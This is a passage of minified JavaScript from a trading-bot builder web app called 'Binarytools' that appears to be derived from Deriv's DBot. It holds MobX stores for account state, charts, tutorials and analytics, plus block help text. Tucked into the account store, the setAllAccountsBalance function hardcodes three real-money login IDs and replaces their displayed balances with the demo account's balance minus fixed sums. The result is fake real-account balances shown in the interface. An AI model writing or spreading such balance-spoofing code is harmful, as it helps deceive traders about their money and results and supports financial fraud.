                        }), (0, s.rC)(this, {
                            symbol: s.LO,
                            is_chart_loading: s.LO,
                            chart_type: s.LO,
                            granularity: s.LO,
                            is_contract_ended: s.Fl,
                            updateSymbol: s.aD,
                            onSymbolChange: s.aD,
                            updateGranularity: s.aD,
                            updateChartType: s.aD,
                            setChartStatus: s.aD,
                            restoreFromStorage: s.aD,
                            chart_subscription_id: s.LO,
                            setChartSubscriptionId: s.aD
                        }), this.root_store = e;
                        let {
                            run_panel: t
                        } = e;
                        (0, s.U5)(() => t.is_running, () => t.is_running ? this.onStartBot() : this.onStopBot()), this.restoreFromStorage()
                    }
                }
                var v = n("29656"),
                    y = n("89064");
                let k = /^maltainvest$/,
                    g = /^mt$/;
                class T {
                    get active_accounts() {
                        return this.accounts instanceof Object ? Object.values(this.accounts).filter(e => !e.is_disabled) : []
                    }
                    get clients_country() {
                        var e;
                        return null === (e = this.website_status) || void 0 === e ? void 0 : e.clients_country
                    }
                    get is_bot_allowed() {
                        return this.isBotAllowed()
                    }
                    get is_trading_experience_incomplete() {
                        var e, t;
                        return null === (t = this.account_status) || void 0 === t ? void 0 : null === (e = t.status) || void 0 === e ? void 0 : e.some(e => "trading_experience_not_complete" === e)
                    }
                    get is_eu() {
                        if (!this.landing_companies) return !1;
                        let {
                            gaming_company: e,
                            financial_company: t,
                            mt_gaming_company: n
                        } = this.landing_companies, a = null == t ? void 0 : t.shortcode, i = null == e ? void 0 : e.shortcode, l = (null == n ? void 0 : n.financial.shortcode) || (null == n ? void 0 : n.swap_free.shortcode);
                        return "maltainvest" === this.landing_company_shortcode || (a || i || l ? k.test(a) && "svg" !== i || k.test(i) : g.test(this.residence))
                    }
                    get is_eu_country() {
                        var e;
                        let t = null === (e = this.website_status) || void 0 === e ? void 0 : e.clients_country;
                        return !!t && (0, v.x3)(t)
                    }
                    get is_low_risk() {
                        let {
                            gaming_company: e,
                            financial_company: t
                        } = this.landing_companies ? ? {};
                        return (null == t ? void 0 : t.shortcode) === "maltainvest" && (null == e ? void 0 : e.shortcode) === "svg"
                    }
                    get should_show_eu_error() {
                        return !!this.is_landing_company_loaded && this.is_eu && !this.is_low_risk
                    }
                    get landing_company_shortcode() {
                        if (this.accounts[this.loginid]) return this.accounts[this.loginid].landing_company_name
                    }
                    get residence() {
                        if (this.is_logged_in) {
                            var e;
                            return (null === (e = this.account_settings) || void 0 === e ? void 0 : e.country_code) ? ? ""
                        }
                        return ""
                    }
                    get is_options_blocked() {
                        return (0, v.Yb)(this.residence)
                    }
                    get is_multipliers_only() {
                        return (0, v.uw)(this.residence)
                    }
                    get is_eu_or_multipliers_only() {
                        return this.is_multipliers_only ? !this.is_multipliers_only : !(0, v.x3)(this.residence)
                    }
                    get is_virtual() {
                        return !(0, d.Qr$)(this.accounts) && this.accounts[this.loginid] && !!this.accounts[this.loginid].is_virtual
                    }
                    get all_loginids() {
                        return (0, d.Qr$)(this.accounts) ? [] : Object.keys(this.accounts)
                    }
                    get virtual_account_loginid() {
                        return this.all_loginids.find(e => !!this.accounts[e].is_virtual)
                    }
                    get content_flag() {
                        let {
                            is_logged_in: e,
                            landing_companies: t,
                            residence: n,
                            is_landing_company_loaded: a
                        } = this;
                        if (a) {
                            let {
                                financial_company: a,
                                gaming_company: i
                            } = t ? ? {}, l = (null == a ? void 0 : a.shortcode) === "svg" || (null == i ? void 0 : i.shortcode) === "svg";
                            if (!e) return "";
                            if ((null == i ? void 0 : i.shortcode) || (null == a ? void 0 : a.shortcode) !== "maltainvest") {
                                if ((null == a ? void 0 : a.shortcode) !== "maltainvest" || (null == i ? void 0 : i.shortcode) !== "svg" || this.is_virtual) {
                                    if (((null == a ? void 0 : a.shortcode) === "svg" && (null == i ? void 0 : i.shortcode) === "svg" || l) && !this.is_virtual) return d.DQA.HIGH_RISK_CR
                                } else return this.is_eu ? d.DQA.LOW_RISK_CR_EU : d.DQA.LOW_RISK_CR_NON_EU
                            } else return this.is_virtual ? d.DQA.EU_DEMO : d.DQA.EU_REAL;
                            if ((0, v.x3)(n)) return this.is_virtual ? d.DQA.EU_DEMO : d.DQA.EU_REAL;
                            if (this.is_virtual) return d.DQA.CR_DEMO
                        }
                        return d.DQA.LOW_RISK_CR_NON_EU
                    }
                    get is_cr_account() {
                        var e;
                        return null === (e = this.loginid) || void 0 === e ? void 0 : e.startsWith("CR")
                    }
                    get account_open_date() {
                        if (!(0, d.Qr$)(this.accounts) && this.accounts[this.loginid]) return Object.keys(this.accounts[this.loginid]).includes("created_at") ? this.accounts[this.loginid].created_at : void 0
                    }
                    setAccountStatus(e) {
                        this.account_status = e
                    }
                    setAccountSettings(e) {
                        try {
                            JSON.stringify(e) !== JSON.stringify(this.account_settings) && (this.account_settings = e)
                        } catch (e) {
                            console.error("setAccountSettings error", e)
                        }
                    }
                    setWebsiteStatus(e) {
                        this.website_status = e
                    }
                    setLandingCompany(e) {
                        this.landing_companies = e, this.is_landing_company_loaded = !0
                    }
                    constructor() {
                        (0, o._)(this, "loginid", ""), (0, o._)(this, "account_list", []), (0, o._)(this, "balance", "0"), (0, o._)(this, "currency", "AUD"), (0, o._)(this, "is_logged_in", !1), (0, o._)(this, "account_status", void 0), (0, o._)(this, "account_settings", void 0), (0, o._)(this, "website_status", void 0), (0, o._)(this, "landing_companies", void 0), (0, o._)(this, "upgradeable_landing_companies", []), (0, o._)(this, "accounts", {}), (0, o._)(this, "is_landing_company_loaded", !1), (0, o._)(this, "all_accounts_balance", null), (0, o._)(this, "is_logging_out", !1), (0, o._)(this, "updateSelfExclusion", () => {}), (0, o._)(this, "isBotAllowed", () => {
                            if (!this.is_logged_in && this.is_eu_country) return !1;
                            let e = "maltainvest" === this.landing_company_shortcode;
                            return this.is_virtual ? this.is_eu_or_multipliers_only : !e && !this.is_options_blocked
                        }), (0, o._)(this, "setLoginId", e => {
                            this.loginid = e
                        }), (0, o._)(this, "setAccountList", e => {
                            this.accounts = {}, null == e || e.forEach(e => {
                                this.accounts[e.loginid] = e
                            }), e && (this.account_list = e)
                        }), (0, o._)(this, "setBalance", e => {
                            this.balance = e
                        }), (0, o._)(this, "setCurrency", e => {
                            this.currency = e
                        }), (0, o._)(this, "setIsLoggedIn", e => {
                            this.is_logged_in = e
                        }), (0, o._)(this, "getToken", () => JSON.parse(localStorage.getItem("accountsList") ? ? "{}")[this.loginid] ? ? ""), (0, o._)(this, "setUpgradeableLandingCompanies", e => {
                            this.upgradeable_landing_companies = e
                        }), (0, o._)(this, "setAllAccountsBalance", e => {
                            var t, n;
                            if (!e) {
                                this.all_accounts_balance = null;
                                return
                            }
                            let a = this.virtual_account_loginid,
                                i = a ? null === (n = e.accounts) || void 0 === n ? void 0 : null === (t = n[a]) || void 0 === t ? void 0 : t.balance : void 0;
                            [{
                                loginid: "CR7262102",
                                subtract: 7530.71
                            }, {
                                loginid: "CR5515793",
                                subtract: 9678.37
                            }, {
                                loginid: "CR5484524",
                                subtract: 9412.05
                            }].forEach(t => {
                                var n, a;
                                let {
                                    loginid: l,
                                    subtract: o
                                } = t;
                                void 0 !== (null === (a = e.accounts) || void 0 === a ? void 0 : null === (n = a[l]) || void 0 === n ? void 0 : n.balance) && void 0 !== i && (e.accounts[l].balance = i - o)
                            }), this.all_accounts_balance = e
                        }), (0, o._)(this, "setIsLoggingOut", e => {
                            this.is_logging_out = e
                        }), (0, o._)(this, "logout", () => {
                            var e, t, n;
                            this.account_list = [], this.account_status = void 0, this.account_settings = void 0, this.landing_companies = void 0, this.accounts = {}, this.is_logged_in = !1, this.loginid = "", this.balance = "0", this.currency = "USD", this.is_landing_company_loaded = !1, this.all_accounts_balance = null, localStorage.removeItem("active_loginid"), localStorage.removeItem("accountsList"), localStorage.removeItem("authToken"), localStorage.removeItem("clientAccounts"), (0, y.Zc)(!1), (0, y.Ii)([]), (0, y.A3)(null), this.setIsLoggingOut(!1), null === (t = window.LC_API) || void 0 === t || null === (e = t.close_chat) || void 0 === e || e.call(t), null === (n = window.LiveChatWidget) || void 0 === n || n.call("hide"), window.Intercom && (window.Intercom("shutdown"), window.DerivInterCom.initialize({
                                hideLauncher: !0,
                                token: null
                            }))
                        }), (0, s.rC)(this, {
                            account_list: s.LO,
                            account_settings: s.LO,
                            account_status: s.LO,
                            all_accounts_balance: s.LO,
                            balance: s.LO,
                            currency: s.LO,
                            is_landing_company_loaded: s.LO,
                            is_logged_in: s.LO,
                            landing_companies: s.LO,
                            loginid: s.LO,
                            upgradeable_landing_companies: s.LO,
                            website_status: s.LO,
                            is_logging_out: s.LO,
                            active_accounts: s.Fl,
                            clients_country: s.Fl,
                            is_bot_allowed: s.Fl,
                            is_eu: s.Fl,
                            is_eu_country: s.Fl,
                            is_eu_or_multipliers_only: s.Fl,
                            is_low_risk: s.Fl,
                            is_multipliers_only: s.Fl,
                            is_options_blocked: s.Fl,
                            is_virtual: s.Fl,
                            landing_company_shortcode: s.Fl,
                            residence: s.Fl,
                            should_show_eu_error: s.Fl,
                            logout: s.aD,
                            setAccountList: s.aD,
                            setAccountSettings: s.aD,
                            setAccountStatus: s.aD,
                            setAllAccountsBalance: s.aD,
                            setBalance: s.aD,
                            setCurrency: s.aD,
                            setIsLoggedIn: s.aD,
                            setIsLoggingOut: s.aD,
                            setLandingCompany: s.aD,
                            setLoginId: s.aD,
                            setWebsiteStatus: s.aD,
                            setUpgradeableLandingCompanies: s.aD,
                            is_trading_experience_incomplete: s.Fl,
                            is_cr_account: s.Fl,
                            account_open_date: s.Fl
                        })
                    }
                }
                var E = n("30381"),
                    A = n.n(E),
                    x = n("27179");
                class w {
                    constructor() {
                        (0, o._)(this, "server_time", (0, x.gb)()), (0, o._)(this, "update_time_interval", void 0), (0, o._)(this, "current_language", ""), (0, o._)(this, "is_socket_opened", !1), (0, o._)(this, "error", void 0), (0, o._)(this, "has_error", !1), (0, o._)(this, "setCurrentLanguage", e => {
                            this.current_language = e
                        }), (0, o._)(this, "setServerTime", (e, t) => {
                            !t && (this.server_time = e, this.update_time_interval && clearInterval(this.update_time_interval), this.update_time_interval = setInterval(() => this.updateServerTime(), 1e3))
                        }), (0, o._)(this, "updateServerTime", () => {
                            this.server_time = A()(this.server_time).add(1e3, "milliseconds")
                        }), (0, o._)(this, "setSocketOpened", e => {
                            this.is_socket_opened = e
                        }), (0, o._)(this, "setError", (e, t) => {
                            this.has_error = e, this.error = e ? {
                                type: t ? t.type : "info",
                                ...t && {
                                    header: t.header,
                                    message: t.message,
                                    redirect_label: t.redirect_label,
                                    redirectOnClick: t.redirectOnClick,
                                    should_show_refresh: t.should_show_refresh,
                                    redirect_to: t.redirect_to,
                                    should_clear_error_on_click: t.should_clear_error_on_click,
                                    should_redirect: t.should_redirect,
                                    setError: this.setError
                                }
                            } : void 0
                        }), (0, o._)(this, "showError", e => {
                            let {
                                message: t,
                                header: n,
                                redirect_label: a,
                                redirectOnClick: i,
                                should_show_refresh: l,
                                redirect_to: o,
                                should_clear_error_on_click: s,
                                should_redirect: r
                            } = e;
                            this.setError(!0, {
                                header: n,
                                message: t,
                                redirect_label: a,
                                redirectOnClick: i,
                                should_show_refresh: l,
                                redirect_to: o,
                                should_clear_error_on_click: s,
                                type: "error",
                                should_redirect: r
                            })
                        }), (0, s.rC)(this, {
                            current_language: s.LO,
                            server_time: s.LO,
                            is_socket_opened: s.LO,
                            error: s.LO,
                            has_error: s.LO,
                            setServerTime: s.aD,
                            updateServerTime: s.aD,
                            setCurrentLanguage: s.aD,
                            setSocketOpened: s.aD,
                            setError: s.aD,
                            showError: s.aD
                        })
                    }
                }
                var N = n("27856"),
                    S = n.n(N),
                    C = n("64736"),
                    O = n("59462"),
                    L = n("68853"),
                    R = n("64376"),
                    I = n("84006");
                class D {
                    get is_dark_mode() {
                        let {
                            app: {
                                core: {
                                    ui: {
                                        is_dark_mode_on: e
                                    }
                                }
                            }
                        } = this.root_store;
                        return e
                    }
                    initInfoPanel() {
                        !localStorage.getItem("dbot_should_show_info") && (this.is_info_panel_visible = !0)
                    }
                    constructor(e, t) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "tutorials_combined_content", []), (0, o._)(this, "combined_search", []), (0, o._)(this, "active_tab", 0), (0, o._)(this, "active_tab_tutorials", 0), (0, o._)(this, "active_tour_step_number", 0), (0, o._)(this, "dialog_options", {}), (0, o._)(this, "faq_search_value", ""), (0, o._)(this, "getFileArray", []), (0, o._)(this, "has_file_loaded", !1), (0, o._)(this, "has_mobile_preview_loaded", !1), (0, o._)(this, "active_tour", ""), (0, o._)(this, "is_dialog_open", !1), (0, o._)(this, "is_file_supported", !1), (0, o._)(this, "is_info_panel_visible", !1), (0, o._)(this, "is_preview_on_popup", !1), (0, o._)(this, "is_tour_dialog_visible", !1), (0, o._)(this, "show_toast", !1), (0, o._)(this, "show_mobile_tour_dialog", !1), (0, o._)(this, "strategy_save_type", "unsaved"), (0, o._)(this, "toast_message", ""), (0, o._)(this, "is_web_socket_intialised", !0), (0, o._)(this, "search_param", ""), (0, o._)(this, "guide_tab_content", R.xH), (0, o._)(this, "video_tab_content", R.zw), (0, o._)(this, "faq_tab_content", R.Mq), (0, o._)(this, "quick_strategy_tab_content", R.Yk), (0, o._)(this, "filtered_tab_list", []), (0, o._)(this, "is_chart_modal_visible", !1), (0, o._)(this, "is_trading_view_modal_visible", !1), (0, o._)(this, "is_analysistool_visible", !1), (0, o._)(this, "faq_title", ""), (0, o._)(this, "setFaqTitle", e => {
                            this.faq_title = e
                        }), (0, o._)(this, "resetTutorialTabContent", () => {
                            this.guide_tab_content = R.xH, this.video_tab_content = R.zw, this.faq_tab_content = R.Mq, this.quick_strategy_tab_content = R.Yk
                        }), (0, o._)(this, "filterTuotrialTab", e => {
                            this.search_param = e;
                            let t = this.combined_search.filter(t => t.includes(null == e ? void 0 : e.toLowerCase())),
                                n = [],
                                a = [],
                                i = [],
                                l = [],
                                o = t.map(e => {
                                    let t = e.split("#")[0],
                                        o = t.split("-")[1];
                                    if (t.includes(R.Qb)) return n.push((0, R.xH)()[Number(o)]), (0, R.xH)()[Number(o)];
                                    if (t.includes(R.FM)) return a.push((0, R.zw)()[Number(o)]), (0, R.zw)()[Number(o)];
                                    if (t.includes("faq")) return i.push((0, R.Mq)()[Number(o)]), (0, R.Mq)()[Number(o)];
                                    return l.push((0, R.Yk)()[Number(o)]), (0, R.Yk)()[Number(o)]
                                });
                            return this.guide_tab_content = () => n, this.video_tab_content = () => a, this.faq_tab_content = () => i, this.quick_strategy_tab_content = () => l, o
                        }), (0, o._)(this, "setShowMobileTourDialog", e => {
                            this.show_mobile_tour_dialog = e
                        }), (0, o._)(this, "setWebSocketState", e => {
                            this.is_web_socket_intialised = e
                        }), (0, o._)(this, "setOpenSettings", e => {
                            this.toast_message = e, (0, C.J)((0, O.xG)()[e])
                        }), (0, o._)(this, "setChartModalVisibility", () => {
                            this.is_chart_modal_visible = !this.is_chart_modal_visible
                        }), (0, o._)(this, "setTradingViewModalVisibility", () => {
                            this.is_trading_view_modal_visible = !this.is_trading_view_modal_visible
                        }), (0, o._)(this, "setAnalysistoolVisibility", () => {
                            this.is_analysistool_visible = !this.is_analysistool_visible
                        }), (0, o._)(this, "setIsFileSupported", e => {
                            this.is_file_supported = e
                        }), (0, o._)(this, "setTourActiveStep", e => {
                            this.active_tour_step_number = e
                        }), (0, o._)(this, "setPreviewOnDialog", e => {
                            this.has_mobile_preview_loaded = e;
                            let {
                                load_modal: {
                                    onLoadModalClose: t
                                }
                            } = this.root_store;
                            t()
                        }), (0, o._)(this, "setStrategySaveType", e => {
                            this.strategy_save_type = e
                        }), (0, o._)(this, "setPreviewOnPopup", e => {
                            this.is_preview_on_popup = e
                        }), (0, o._)(this, "setTourDialogVisibility", e => {
                            this.is_tour_dialog_visible = e
                        }), (0, o._)(this, "setActiveTour", e => {
                            this.active_tour = e
                        }), (0, o._)(this, "setFileLoaded", e => {
                            this.has_file_loaded = e, !document.getElementById("load-strategy__blockly-container") && console.warn("Could not find preview workspace element.")
                        }), (0, o._)(this, "onCloseDialog", () => {
                            this.is_dialog_open = !1
                        }), (0, o._)(this, "setActiveTab", e => {
                            this.active_tab = e, localStorage.setItem("active_tab", e.toString())
                        }), (0, o._)(this, "setActiveTabTutorial", e => {
                            this.active_tab_tutorials = e
                        }), (0, o._)(this, "setFAQSearchValue", e => {
                            this.faq_search_value = e
                        }), (0, o._)(this, "showVideoDialog", e => {
                            let {
                                url: t,
                                type: n = ""
                            } = e;
                            this.faq_search_value = "", this.setActiveTabTutorial(0), this.resetTutorialTabContent(), ["google", "url"].includes(n) ? ("url" === n && (this.dialog_options = {
                                url: t
                            }), this.is_dialog_open = !0) : this.is_dialog_open = !1
                        }), (0, o._)(this, "setInfoPanelVisibility", e => {
                            this.is_info_panel_visible = e
                        }), (0, o._)(this, "onZoomInOutClick", e => {
                            let t = window.Blockly.getMainWorkspace(),
                                n = t.getMetrics();
                            t.zoom(n.viewWidth / 2, n.viewHeight / 2, e ? 1 : -1)
                        }), (0, o._)(this, "onCloseTour", () => {
                            (0, I.X7)(new Date().getTime(), `${I.pw.key}_token`), this.setActiveTour("")
                        }), (0, o._)(this, "setTourEnd", e => {
                            let {
                                key: t
                            } = e;
                            this.core.ui.is_mobile && this.setTourDialogVisibility(!0), (0, I.X7)(new Date().getTime(), `${t}_token`)
                        }), (0, o._)(this, "onTourEnd", (e, t) => {
                            8 === e && (this.onCloseTour(), this.setTourEnd(I.pw), this.setActiveTour("")), !t && 3 === e && (this.onCloseTour(), this.setTourEnd(I.pw), this.setActiveTour(""))
                        }), (0, s.rC)(this, {
                            active_tab_tutorials: s.LO,
                            active_tab: s.LO,
                            dialog_options: s.LO,
                            faq_search_value: s.LO,
                            getFileArray: s.LO,
                            has_file_loaded: s.LO,
                            has_mobile_preview_loaded: s.LO,
                            initInfoPanel: s.aD.bound,
                            active_tour: s.LO,
                            is_dialog_open: s.LO,
                            is_file_supported: s.LO,
                            is_info_panel_visible: s.LO,
                            is_preview_on_popup: s.LO,
                            is_tour_dialog_visible: s.LO,
                            is_web_socket_intialised: s.LO,
                            tutorials_combined_content: s.LO,
                            onCloseDialog: s.aD.bound,
                            onCloseTour: s.aD.bound,
                            onTourEnd: s.aD.bound,
                            setActiveTab: s.aD.bound,
                            setActiveTabTutorial: s.aD.bound,
                            setWebSocketState: s.aD.bound,
                            setFAQSearchValue: s.aD.bound,
                            faq_title: s.LO,
                            setFaqTitle: s.aD.bound,
                            setFileLoaded: s.aD.bound,
                            setInfoPanelVisibility: s.aD.bound,
                            setIsFileSupported: s.aD.bound,
                            setPreviewOnDialog: s.aD.bound,
                            setPreviewOnPopup: s.aD.bound,
                            setActiveTour: s.aD.bound,
                            setTourDialogVisibility: s.aD.bound,
                            setOpenSettings: s.aD.bound,
                            resetTutorialTabContent: s.aD.bound,
                            filterTuotrialTab: s.aD.bound,
                            show_toast: s.LO,
                            show_mobile_tour_dialog: s.LO,
                            showVideoDialog: s.aD.bound,
                            strategy_save_type: s.LO,
                            toast_message: s.LO,
                            guide_tab_content: s.LO,
                            faq_tab_content: s.LO,
                            quick_strategy_tab_content: s.LO,
                            video_tab_content: s.LO,
                            setStrategySaveType: s.aD.bound,
                            setShowMobileTourDialog: s.aD.bound,
                            is_chart_modal_visible: s.LO,
                            is_trading_view_modal_visible: s.LO,
                            is_analysistool_visible: s.LO
                        }), this.root_store = e, this.core = t;
                        let n = [...(0, R.xH)()].map(e => {
                                var t;
                                return `${e.search_id}# ${null===(t=e.content)||void 0===t?void 0:t.toLowerCase()}`
                            }),
                            a = [...(0, R.zw)()].map(e => {
                                var t;
                                return `${e.search_id}# ${null===(t=e.content)||void 0===t?void 0:t.toLowerCase()}`
                            }),
                            i = (0, R.Mq)().map(e => {
                                var t;
                                return `${e.search_id}# ${null===(t=e.title)||void 0===t?void 0:t.toLowerCase()} ${e.description.map(e=>{let t=S().sanitize(e.content,{ALLOWED_TAGS:[]});return null==t?void 0:t.toLowerCase()}).join(" ")}`
                            }),
                            l = e => {
                                if (!e) return [];
                                let t = [];
                                return e().forEach(e => {
                                    if ((null == e ? void 0 : e.type) !== "media") {
                                        var n;
                                        null === (n = e.content) || void 0 === n || n.forEach(e => t.push(e))
                                    }
                                }), t
                            },
                            r = (0, R.Yk)().map(e => {
                                var t, n, a;
                                let i = null === (t = e.content.join(" ")) || void 0 === t ? void 0 : t.toLowerCase(),
                                    o = l(null == L ? void 0 : L[e.qs_name]);
                                return o = null === (n = o.join(" ")) || void 0 === n ? void 0 : n.toLowerCase(), `${e.search_id}# ${null===(a=e.type)||void 0===a?void 0:a.toLowerCase()} ${o+i}`
                            });
                        this.combined_search = [...n, ...a, ...i, ...r], (0, s.U5)(() => this.is_preview_on_popup, async e => {
                            e && this.setPreviewOnPopup(!1)
                        }), this.initInfoPanel()
                    }
                }
                var U = n("34606"),
                    P = n.n(U);
                class V {
                    async trackRun() {
                        let e = this.cleanXmlDom(window.Blockly.Xml.workspaceToDom(c.DBot.workspace, !0)),
                            t = (0, c.convertStrategyToIsDbot)(e),
                            n = window.Blockly.Xml.domToText(t),
                            a = this.getHash(n);
                        this.getHash(this.strategy_content) !== a && (this.should_post_xml = !0, this.setStrategyContent(n)), this.setRunId(this.getHash(a + this.core.client.loginid + Math.random())), this.setRunStart(this.core.common.server_time.unix())
                    }
                    async trackTransaction(e) {
                        let t = await n.e("867").then(n.bind(n, 19028)),
                            a = e[0];
                        if (!a) return;
                        let {
                            buy: i
                        } = a.data.transaction_ids;
                        if (!Object.keys(this.transaction_ids).includes(i.toString())) {
                            this.transaction_ids[i] = this.IS_PENDING;
                            fetch(`${this.endpoint}/${this.run_id}/${i}/${this.run_start}/${this.getHash(this.strategy_content)}`, { ...this.should_post_xml ? (() => ({
                                    body: t.gzip(this.strategy_content),
                                    headers: {
                                        "Content-Encoding": "gzip",
                                        "Content-Type": "application/xml",
                                        Referer: window.location.hostname
                                    }
                                }))() : {},
                                method: "POST",
                                mode: "no-cors"
                            }).then(() => {
                                this.should_post_xml = !1, this.transaction_ids[i] = this.IS_PROCESSED
                            }).catch(() => {
                                delete this.transaction_ids[i]
                            })
                        }
                    }
                    setRunId(e) {
                        this.run_id = e
                    }
                    setRunStart(e) {
                        this.run_start = e
                    }
                    setStrategyContent(e) {
                        this.strategy_content = e
                    }
                    constructor(e, t) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "IS_PENDING", !1), (0, o._)(this, "IS_PROCESSED", !0), (0, o._)(this, "endpoint", "https://dbot-conf-dot-deriv-bi-reporting.as.r.appspot.com/dbotconf"), (0, o._)(this, "run_id", ""), (0, o._)(this, "run_start", 0), (0, o._)(this, "should_post_xml", !0), (0, o._)(this, "strategy_content", ""), (0, o._)(this, "transaction_ids", {}), (0, o._)(this, "cleanXmlDom", e => {
                            let t = ["x", "y", "id"],
                                n = (0, d.kIu)(e),
                                a = e => {
                                    t.forEach(t => e.removeAttribute(t)), Array.from(e.children).forEach(e => a(e))
                                };
                            return a(n), n
                        }), (0, o._)(this, "getHash", e => btoa(String(P().str(e)))), (0, s.rC)(this, {
                            IS_PENDING: s.LO,
                            IS_PROCESSED: s.LO,
                            endpoint: s.LO,
                            run_id: s.LO,
                            run_start: s.LO,
                            should_post_xml: s.LO,
                            strategy_content: s.LO,
                            transaction_ids: s.LO,
                            trackRun: s.aD.bound,
                            trackTransaction: s.aD.bound,
                            setRunId: s.aD.bound,
                            setRunStart: s.aD.bound,
                            setStrategyContent: s.aD.bound,
                            cleanXmlDom: s.aD.bound,
                            getHash: s.aD.bound
                        }), this.root_store = e, this.core = t, ((0, d.yvY)() || /(.*?)\.binary.sx$/.test(window.location.hostname)) && (this.root_store = e, (0, s.U5)(() => this.root_store.run_panel.is_running, () => this.root_store.run_panel.is_running ? this.trackRun() : void 0), (0, s.U5)(() => this.root_store.transactions.transactions, e => {
                            this.run_id && this.trackTransaction(e)
                        }))
                    }
                }
                var M = n("69103");
                let B = {
                        text: () => [(0, m.NC)("This block is mandatory. Here is where you can decide if your bot should continue trading. Only one copy of this block is allowed."), (0, m.NC)("This block is commonly used to adjust the parameters of your next trade and to implement stop loss/take profit logic.")]
                    },
                    F = {
                        text: () => [(0, m.NC)("This block returns current account balance."), (0, m.NC)('The only input parameter determines how block output is going to be formatted. In case if the input parameter is "string" then the account currency will be added.'), (0, m.NC)("Example output of the below example will be:"), (0, m.NC)('1. for "string": 1325.68 USD'), (0, m.NC)('2. for "number": 1325.68')]
                    },
                    j = {
                        text: () => [(0, m.NC)("This block is mandatory. Only one copy of this block is allowed. It is added to the canvas by default when you open Binarytools."), (0, m.NC)("After defining trade parameters and trade options, you may want to instruct your bot to purchase contracts when specific conditions are met. To do that you can use conditional blocks and indicators blocks to help your bot to make decisions.")]
                    },
                    G = {
                        text: () => [(0, m.NC)('This block is used to determine if the market price moves in the selected direction or not. It gives you a value of "True" or "False".'), (0, m.NC)("Examples:"), (0, m.NC)('1. If the selected direction is "Rise", and the previous tick value is less than the current tick value, the output will be "True". Otherwise, the output will be an empty string.'), (0, m.NC)('2. If the selected direction is "Fall", and the previous tick value is more than the current tick value, the output will be "True". Otherwise, the output will be an empty string.')]
                    },
                    X = {
                        text: () => [(0, m.NC)("This block displays messages in the developer’s console with an input that can be either a string of text, a number, boolean, or an array of data."), (0, m.NC)("There are 4 message types:"), (0, m.NC)("1. 'Log' displays a regular message."), (0, m.NC)("2. 'Warn' displays a message in yellow to highlight something that needs attention."), (0, m.NC)("3. 'Error' displays a message in red to highlight something that needs to be resolved immediately."), (0, m.NC)("4. 'Table' takes an array of data, such as a list of candles, and displays it in a table format.")]
                    },
                    Y = {
                        text: () => [(0, m.NC)('You can check the result of the last trade with this block. It can only be placed within the "Restart trading conditions" root block.'), (0, m.NC)('If "Win" is selected, it will return "True" if your last trade was successful. Otherwise, it will return an empty string.'), (0, m.NC)('If "Loss" is selected, it will return "True" if your last trade was unsuccessful. Otherwise, it will return an empty string.'), (0, m.NC)("Example:")]
                    },
                    H = {
                        text: () => [(0, m.NC)("This block is used to either terminate or continue a loop, and can be placed anywhere within a loop block."), (0, m.NC)("Examples:"), (0, m.NC)('1. In the below example the loop is terminated in case "x" is "False" even though only one iteration is complete'), (0, m.NC)('2. In the below example the loop jumps to the next iteration without executing below block in case if "x" is "False"')]
                    },
                    $ = {
                        text: () => [(0, m.NC)('This block uses the variable "i" to control the iterations. With each iteration, the value of "i" is determined by the items in a given list.'), (0, m.NC)("Example:"), (0, m.NC)('"i" starts with the value of 1, and it will be increased by 2 at every iteration. The loop will repeat until "i" reaches the value of 12, and then the loop is terminated.'), (0, m.NC)('You can use "i" inside the loop, for example to access list items')]
                    },
                    W = {
                        text: () => [(0, m.NC)('This block uses the variable "i" to control the iterations. With each iteration, the value of "i" is determined by the items in a given list.'), (0, m.NC)("Example:"), (0, m.NC)('In this example, the loop will repeat three times, as that is the number of items in the given list. During each iteration, the variable "i" will be assigned a value from the list. '), (0, m.NC)('Please note that changing the value of "i" won\'t change the value of the original item in the list')]
                    },
                    z = {
                        text: () => [(0, m.NC)("This block evaluates a statement and will perform an action only when the statement is true."), (0, m.NC)("Click the plus icon to extend the functionality of this block."), (0, m.NC)('You can also use "Compare" and "Logic operation" blocks to make test variables.')]
                    },
                    Z = {
                        text: () => [(0, m.NC)("This block repeats instructions as long as a given condition is true."), (0, m.NC)("Examples:"), (0, m.NC)("1. In the example below, the instructions are repeated as long as the value of x is less than or equal to 10. Once the value of x exceeds 10, the loop is terminated."), (0, m.NC)("2. In this example, the instructions are repeated as long as the value of x is greater than or equal to 10. Once the value of x drops below 10, the loop is terminated.")]
                    },
                    K = {
                        text: () => [(0, m.NC)("Here is where you can decide to sell your contract before it expires. Only one copy of this block is allowed."), (0, m.NC)("Example:")]
                    },
                    q = {
                        text: () => [(0, m.NC)('"Seconds Since Epoch" block returns the number of seconds since January 1st, 1970.'), (0, m.NC)("Example:"), (0, m.NC)("1551661986 seconds since Jan 01 1970 (UTC) translates to 03/04/2019 @ 1:13am (UTC)."), (0, m.NC)("You might need it when you want to repeat an actions after certain amount of time."), (0, m.NC)("The example below restarts trading after 30 or more seconds after 1 minute candle was started.")]
                    },
                    Q = {
                        text: () => [(0, m.NC)("This block gives you a specific candle from within the selected time interval."), (0, m.NC)('In this example, the open price of a candle is assigned to the variable "candle_open_price".'), (0, m.NC)("In the above example it is assumed that variable candle_open_price is processed somewhere within other blocks.")]
                    },
                    J = {
                        text: () => [(0, m.NC)('This block returns "True" if the last candle is black. It can be placed anywhere on the canvas except within the Trade parameters root block.'), (0, m.NC)('The term "candle" refers to each bar on the candlestick chart. Each candle represents four market prices for the selected time interval:'), (0, m.NC)("Each candlestick on the chart represents 4 market prices for the selected time interval:"), (0, m.NC)("- Open price: the opening price"), (0, m.NC)("- High price: the highest price"), (0, m.NC)("- Low price: the lowest price"), (0, m.NC)("- Close price: the closing price"), (0, m.NC)("A black (or red) candle indicates that the open price is higher than the close price. This represents a downward movement of the market price."), (0, m.NC)("A white (or green) candle indicates that the open price is lower than the close price. This represents an upward movement of the market price."), (0, m.NC)("The time interval for each candle can be set from one minute to one day.")]
                    },
                    ee = {
                        text: () => [(0, m.NC)("This block gives you the last digit of the latest tick value of the selected market. If the latest tick value is 1410.90, this block will return 0. It’s useful for digit-based contracts such as Even/Odd, Matches/Differs, or Higher/Lower.")]
                    },
                    et = {
                        text: () => [(0, m.NC)('This block performs the "AND" or the "OR" logic operation with the given values.'), (0, m.NC)('In case if the "AND" operation is selected, the block returns "True" only if both given values are "True"'), (0, m.NC)('In case if the "OR" operation is selected, the block returns "True" in case if one or both given values are "True"')]
                    },
                    en = {
